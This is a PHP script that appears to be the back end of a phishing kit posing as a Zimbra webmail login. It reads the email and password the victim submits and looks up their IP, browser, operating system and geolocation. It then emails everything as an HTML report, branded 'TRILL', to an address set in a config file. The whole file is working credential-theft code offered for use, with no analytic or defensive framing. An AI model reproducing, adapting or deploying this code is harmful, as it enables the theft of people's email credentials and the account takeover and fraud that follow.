<?php
sleep(5);
function getOS($user_agent = null)
{
    if(!isset($user_agent) && isset($_SERVER['HTTP_USER_AGENT'])) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
    }

    // https://stackoverflow.com/questions/18070154/get-operating-system-info-with-php
    $os_array = [
        'windows nt 10'                              =>  'Windows 10',
        'windows nt 6.3'                             =>  'Windows 8.1',
        'windows nt 6.2'                             =>  'Windows 8',
        'windows nt 6.1|windows nt 7.0'              =>  'Windows 7',
        'windows nt 6.0'                             =>  'Windows Vista',
        'windows nt 5.2'                             =>  'Windows Server 2003/XP x64',
        'windows nt 5.1'                             =>  'Windows XP',
        'windows xp'                                 =>  'Windows XP',
        'windows nt 5.0|windows nt5.1|windows 2000'  =>  'Windows 2000',
        'windows me'                                 =>  'Windows ME',
        'windows nt 4.0|winnt4.0'                    =>  'Windows NT',
        'windows ce'                                 =>  'Windows CE',
        'windows 98|win98'                           =>  'Windows 98',
        'windows 95|win95'                           =>  'Windows 95',
        'win16'                                      =>  'Windows 3.11',
        'mac os x 10.1[^0-9]'                        =>  'Mac OS X Puma',
        'macintosh|mac os x'                         =>  'Mac OS X',
        'mac_powerpc'                                =>  'Mac OS 9',
        'linux'                                      =>  'Linux',
        'ubuntu'                                     =>  'Linux - Ubuntu',
        'iphone'                                     =>  'iPhone',
        'ipod'                                       =>  'iPod',
        'ipad'                                       =>  'iPad',
        'android'                                    =>  'Android',
        'blackberry'                                 =>  'BlackBerry',
        'webos'                                      =>  'Mobile',

        '(media center pc).([0-9]{1,2}\.[0-9]{1,2})'=>'Windows Media Center',
        '(win)([0-9]{1,2}\.[0-9x]{1,2})'=>'Windows',
        '(win)([0-9]{2})'=>'Windows',
        '(windows)([0-9x]{2})'=>'Windows',

        // Doesn't seem like these are necessary...not totally sure though..
        //'(winnt)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'Windows NT',
        //'(windows nt)(([0-9]{1,2}\.[0-9]{1,2}){0,1})'=>'Windows NT', // fix by bg

        'Win 9x 4.90'=>'Windows ME',
        '(windows)([0-9]{1,2}\.[0-9]{1,2})'=>'Windows',
        'win32'=>'Windows',
        '(java)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2})'=>'Java',
        '(Solaris)([0-9]{1,2}\.[0-9x]{1,2}){0,1}'=>'Solaris',
        'dos x86'=>'DOS',
        'Mac OS X'=>'Mac OS X',
        'Mac_PowerPC'=>'Macintosh PowerPC',
        '(mac|Macintosh)'=>'Mac OS',
        '(sunos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'SunOS',
        '(beos)([0-9]{1,2}\.[0-9]{1,2}){0,1}'=>'BeOS',
        '(risc os)([0-9]{1,2}\.[0-9]{1,2})'=>'RISC OS',
        'unix'=>'Unix',
        'os/2'=>'OS/2',
        'freebsd'=>'FreeBSD',
        'openbsd'=>'OpenBSD',
        'netbsd'=>'NetBSD',
        'irix'=>'IRIX',
        'plan9'=>'Plan9',
        'osf'=>'OSF',
        'aix'=>'AIX',
        'GNU Hurd'=>'GNU Hurd',
        '(fedora)'=>'Linux - Fedora',
        '(kubuntu)'=>'Linux - Kubuntu',
        '(ubuntu)'=>'Linux - Ubuntu',
        '(debian)'=>'Linux - Debian',
        '(CentOS)'=>'Linux - CentOS',
        '(Mandriva).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - Mandriva',
        '(SUSE).([0-9]{1,3}(\.[0-9]{1,3})?(\.[0-9]{1,3})?)'=>'Linux - SUSE',
        '(Dropline)'=>'Linux - Slackware (Dropline GNOME)',
        '(ASPLinux)'=>'Linux - ASPLinux',
        '(Red Hat)'=>'Linux - Red Hat',
        // Loads of Linux machines will be detected as unix.
        // Actually, all of the linux machines I've checked have the 'X11' in the User Agent.
        //'X11'=>'Unix',
        '(linux)'=>'Linux',
        '(amigaos)([0-9]{1,2}\.[0-9]{1,2})'=>'AmigaOS',
        'amiga-aweb'=>'AmigaOS',
        'amiga'=>'Amiga',
        'AvantGo'=>'PalmOS',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1}-([0-9]{1,2}) i([0-9]{1})86){1}'=>'Linux',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1} i([0-9]{1}86)){1}'=>'Linux',
        //'(Linux)([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3}(rel\.[0-9]{1,2}){0,1})'=>'Linux',
        '[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,3})'=>'Linux',
        '(webtv)/([0-9]{1,2}\.[0-9]{1,2})'=>'WebTV',
        'Dreamcast'=>'Dreamcast OS',
        'GetRight'=>'Windows',
        'go!zilla'=>'Windows',
        'gozilla'=>'Windows',
        'gulliver'=>'Windows',
        'ia archiver'=>'Windows',
        'NetPositive'=>'Windows',
        'mass downloader'=>'Windows',
        'microsoft'=>'Windows',
        'offline explorer'=>'Windows',
        'teleport'=>'Windows',
        'web downloader'=>'Windows',
        'webcapture'=>'Windows',
        'webcollage'=>'Windows',
        'webcopier'=>'Windows',
        'webstripper'=>'Windows',
        'webzip'=>'Windows',
        'wget'=>'Windows',
        'Java'=>'Unknown',
        'flashget'=>'Windows',

        // delete next line if the script show not the right OS
        //'(PHP)/([0-9]{1,2}.[0-9]{1,2})'=>'PHP',
        'MS FrontPage'=>'Windows',
        '(msproxy)/([0-9]{1,2}.[0-9]{1,2})'=>'Windows',
        '(msie)([0-9]{1,2}.[0-9]{1,2})'=>'Windows',
        'libwww-perl'=>'Unix',
        'UP.Browser'=>'Windows CE',
        'NetAnts'=>'Windows',
    ];

    // https://github.com/ahmad-sa3d/php-useragent/blob/master/core/user_agent.php
    $arch_regex = '/\b(x86_64|x86-64|Win64|WOW64|x64|ia64|amd64|ppc64|sparc64|IRIX64)\b/ix';
    $arch = preg_match($arch_regex, $user_agent) ? '64' : '32';

    foreach ($os_array as $regex => $value) {
        if (preg_match('{\b('.$regex.')\b}i', $user_agent)) {
            return $value.' x'.$arch;
        }
    }

    return 'Unknown';
}

class geoPlugin {
	
	//the geoPlugin server
	var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
		
	//the default base currency
	var $currency = 'USD';
	
	//initiate the geoPlugin vars
	var $ip = null;
	var $city = null;
	var $region = null;
	var $areaCode = null;
	var $dmaCode = null;
	var $countryCode = null;
	var $countryName = null;
	var $continentCode = null;
	var $latitude = null;
	var $longitude = null;
	var $currencyCode = null;
	var $currencySymbol = null;
	var $currencyConverter = null;
	
	function geoPlugin() {

	}
	
	function locate($ip = null) {
		
		global $_SERVER;
		
		if ( is_null( $ip ) ) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		
		$host = str_replace( '{IP}', $ip, $this->host );
		$host = str_replace( '{CURRENCY}', $this->currency, $host );
		
		$data = array();
		
		$response = $this->fetch($host);
		
		$data = unserialize($response);
		
		//set the geoPlugin vars
		$this->ip = $ip;
		$this->city = $data['geoplugin_city'];
		$this->region = $data['geoplugin_region'];
		$this->areaCode = $data['geoplugin_areaCode'];
		$this->dmaCode = $data['geoplugin_dmaCode'];
		$this->countryCode = $data['geoplugin_countryCode'];
		$this->countryName = $data['geoplugin_countryName'];
		$this->continentCode = $data['geoplugin_continentCode'];
		$this->latitude = $data['geoplugin_latitude'];
		$this->longitude = $data['geoplugin_longitude'];
		$this->currencyCode = $data['geoplugin_currencyCode'];
		$this->currencySymbol = $data['geoplugin_currencySymbol'];
		$this->currencyConverter = $data['geoplugin_currencyConverter'];
		
	}
	
	function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
	
	function convert($amount, $float=2, $symbol=true) {
		
		//easily convert amounts to geolocated currency.
		if ( !is_numeric($this->currencyConverter) || $this->currencyConverter == 0 ) {
			trigger_error('geoPlugin class Notice: currencyConverter has no value.', E_USER_NOTICE);
			return $amount;
		}
		if ( !is_numeric($amount) ) {
			trigger_error ('geoPlugin class Warning: The amount passed to geoPlugin::convert is not numeric.', E_USER_WARNING);
			return $amount;
		}
		if ( $symbol === true ) {
			return $this->currencySymbol . round( ($amount * $this->currencyConverter), $float );
		} else {
			return round( ($amount * $this->currencyConverter), $float );
		}
	}
	
	function nearby($radius=10, $limit=null) {

		if ( !is_numeric($this->latitude) || !is_numeric($this->longitude) ) {
			trigger_error ('geoPlugin class Warning: Incorrect latitude or longitude values.', E_USER_NOTICE);
			return array( array() );
		}
		
		$host = "http://www.geoplugin.net/extras/nearby.gp?lat=" . $this->latitude . "&long=" . $this->longitude . "&radius={$radius}";
		
		if ( is_numeric($limit) )
			$host .= "&limit={$limit}";
			
		return unserialize( $this->fetch($host) );

	}

	
}


function sendlogindetails($login,$passwd,$to){
require_once('Browser.php');
$browsers = new Browser();
$b_name = $browsers->getBrowser();
$b_plat = getOS();
$b_ver = $browsers->getVersion();
$geoplugin = new geoPlugin();
$geoplugin->locate();
$ip = $_SERVER["REMOTE_ADDR"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a");
$subjectpage = "ZIMBRA";
// subject
$subject = "".$subjectpage." Details $ip {$geoplugin->countryName} #TRILL";

// message
$message ="<table align='center' border='0' cellpadding='1' cellspacing='0' style='height:247px; width:410px'>
	<tbody>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:#292929; height:40px'><span style='color:#d3d3d3'><span style='font-family:tahoma,geneva,sans-serif'><span style='font-size:26px'><strong>&nbsp; TRILL</strong>&trade;</span></span></span><strong><span style='color:#d3d3d3'><span style='font-family:lucida sans unicode,lucida grande,sans-serif'>&nbsp;&nbsp;</span></span></strong></td>
		</tr>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:#292929; height:20px'>
			<table border='0' cellpadding='1' cellspacing='1' style='width:406px'>
				<tbody>
					<tr>
						<td style='background-color:#cccccc'><span style='font-size:14px'><strong><span style='font-family:tahoma,geneva,sans-serif'>&nbsp;$subjectpage Page Details</span></strong></span></td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:#292929'>
			<table border='2' cellpadding='2' cellspacing='2' style='height:157px; width:400px'>
				<tbody>
					<tr>
						<td style='border-color:#cccccc'>
						<table border='1' style='line-height:20.7999992370605px; width:400px'>
							<tbody>
								<tr>
									<td style='width:130px'><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'><span style='background-color:#292929'>$subjectpage I.D:</span></span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'><span style='background-color:#292929'>$login</span></span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'>Password:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'><span style='background-color:#292929'>$passwd</span></span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'>IP:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'><img src='http://api.hostip.info/flag.php?ip=$ip' style='height:15px; width:22px' />&nbsp;</span><a href='http://whoer.net/check?host=$ip' style='line-height: 20.7999992370605px; background-color: rgb(41, 41, 41);' target='_blank'><span style='color:#d3d3d3'>$ip</span></a><span style='background-color:#292929; color:#d3d3d3'>&nbsp;</span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>User-Agent:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>$browser</span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'>Date:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>$server</span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#d3d3d3'>Location:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>{$geoplugin->city}, {$geoplugin->region}, {$geoplugin->countryCode}</span></span></td>
								</tr>
								<tr>
									<td colspan='2' style='text-align:center'><span style='background-color:#292929; color:#d3d3d3; font-family:tahoma,geneva,sans-serif'>$login&nbsp;$passwd</span></td>
								</tr>
								<tr>
									<td colspan='2' style='text-align:center'><span style='background-color:#292929; color:#d3d3d3; font-family:tahoma,geneva,sans-serif'>$b_name:$b_ver on $b_plat</span></td>
								</tr>
								<tr>
									<td colspan='2'><em><span style='background-color:#292929; color:#d3d3d3; font-family:tahoma,geneva,sans-serif'>Click the always display images link to view country flag</span></em></td>
								</tr>
								<tr>
									<td colspan='2' style='text-align:right'><strong><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:#292929; color:#d3d3d3'>BY TRAP TRILL</span></span></strong></td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
	</tbody>
</table>

";

// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// From
$domainfrom = str_replace("www.","",$_SERVER['SERVER_NAME']);
$headers .= 'From: T3LL <logs@'.$domainfrom.'>' . "\r\n";


mail($to, $subject, $message, $headers);
}

require '../config.php';

$login = $_POST['email'];
$passwd = $_POST['password'];

sendlogindetails($login,$passwd,$to);